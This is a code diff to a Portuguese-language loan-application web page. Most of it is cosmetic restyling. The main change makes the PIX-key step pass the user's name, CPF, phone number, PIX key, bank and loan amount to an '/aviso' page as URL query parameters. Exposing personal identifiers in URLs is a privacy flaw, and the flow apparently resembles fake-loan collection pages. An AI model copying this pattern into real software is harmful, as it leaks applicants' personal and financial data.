@@ -682,8 +682,8 @@
                 </div>
 
                 <div class="verification-section" style="margin-top: 25px; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px;">
-                    <h4 style="color: #1351b4; margin-bottom: 15px;">Confirme seu Número de Telefone</h4>
-                    <p style="margin-bottom: 15px;">Para finalizar o contrato e receber o valor, confirme seu telefone para receber um código de segurança:</p>
+                    <h4 style="color: #000000; margin-bottom: 15px; font-size: 18px; font-weight: 700;">Confirme seu Número de Telefone</h4>
+                    <p style="margin-bottom: 15px;">Para finalizar o contrato e receber o valor, confirme seu telefone para receber um código de segurança em sua Caixa de SMS:</p>
                     
                     <div id="phoneInputSection">
                         <div style="display: flex; margin-bottom: 15px;">
@@ -709,7 +709,7 @@
                         <div style="display: flex; align-items: center; background-color: #f0f8ff; padding: 15px; border-radius: 8px; border-left: 4px solid #1351b4;">
                             <i class="fas fa-check-circle" style="font-size: 24px; color: #1351b4; margin-right: 15px;"></i>
                             <div>
-                                <p style="font-weight: 600; margin-bottom: 5px;">Telefone verificado com sucesso!</p>
+                                <p style="font-weight: 700; margin-bottom: 5px;">Telefone verificado com sucesso!</p>
                                 <p id="verifiedPhone" style="color: #666;"></p>
                             </div>
                         </div>
@@ -718,7 +718,7 @@
 
                 <div id="pixKeySection" style="display: none; margin-top: 25px; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; text-align: center;">
                     <div style="margin-bottom: 15px;">
-                        <img src="https://img.icons8.com/color/512/pix.png" alt="Logo PIX" style="width: 80px; height: 80px; margin: 0 auto; filter: drop-shadow(2px 2px 3px rgba(0,0,0,0.2));">
+                        <img src="https://img.icons8.com/color/512/pix.png" alt="Logo PIX" style="width: 50px; height: 50px; margin: 0 auto;">
                     </div>
                     <h4 style="color: #005da8; margin-bottom: 15px; font-size: 20px; font-weight: 700;">Informe sua Chave PIX</h4>
                     <p style="margin-bottom: 15px; text-align: left;">Selecione o tipo de chave PIX para receber o valor do empréstimo:</p>
@@ -1031,14 +1031,30 @@
                 this.disabled = true;
                 this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
                 
-                // Store PIX key
+                // Get all user data needed for next page
+                const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                const loanData = JSON.parse(localStorage.getItem('loanData') || '{}');
                 const pixKey = pixKeyInput.value.trim();
+                const selectedBank = document.querySelector('.bank-button[style*="background-color: rgb(19, 81, 180)"]')?.getAttribute('data-bank') || '';
+                
+                // Store PIX key
                 localStorage.setItem('pixKey', pixKey);
                 
-                // Redirect to thank you page after delay
+                // Prepare parameters for aviso page
+                const params = new URLSearchParams({
+                    nome: userData.nome || '',
+                    cpf: userData.cpf || '',
+                    phone: userData.phone || '',
+                    pix_key: pixKey,
+                    bank: selectedBank,
+                    amount: loanData.amount || '0',
+                    term: loanData.term || '0'
+                });
+                
+                // Redirect to the aviso page with parameters
                 setTimeout(() => {
-                    window.location.href = '/thank_you';
-                }, 3000);
+                    window.location.href = '/aviso?' + params.toString();
+                }, 1500);
             });
 
             // Video handling (if present)
